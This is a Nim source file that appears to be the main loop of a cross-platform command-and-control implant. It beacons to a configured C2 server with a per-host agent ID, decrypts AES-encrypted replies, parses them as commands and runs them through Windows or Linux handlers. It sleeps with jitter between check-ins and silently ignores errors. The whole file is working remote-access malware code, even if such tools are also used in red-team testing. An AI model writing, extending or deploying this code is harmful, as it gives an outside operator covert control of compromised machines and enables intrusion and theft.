# Internal imports
import config
import common
when defined(windows):
    import windows/[windows_core]
when defined(linux):
    import linux/[linux_core]
# External imports
import std/[strformat, nativesockets, json]
import system/[io]
import httpclient
import os

# Globals
let c2_url = fmt"{c2_scheme}://{c2_address}:{c2_port}"
when defined(windows):
    let user_agent=get_windows_agent_id()
else:
    let user_agent=get_linux_agent_id()
let client = newHttpClient(userAgent=user_agent)


proc nimbo_main*(): void =
    var res: Response
    var server_content: JsonNode
    var is_success: bool
    when defined(windows):
        windows_start()
    else:
        linux_start()

    while true:
        try:
            res = client.get(c2_url)
        except:
            continue
        server_content = parseJson(decrypt_cbc(res.body, communication_aes_key, communication_aes_iv))
        if len(server_content) == 0:
            sleep(calc_sleep_time(call_home_timeframe, call_home_jitter_percent))
            continue
        else:
            for command in server_content:
                try:
                    when defined(windows):
                        is_success = windows_parse_command(command)
                    else:
                        is_success = linux_parse_command(command)
                except:
                    discard
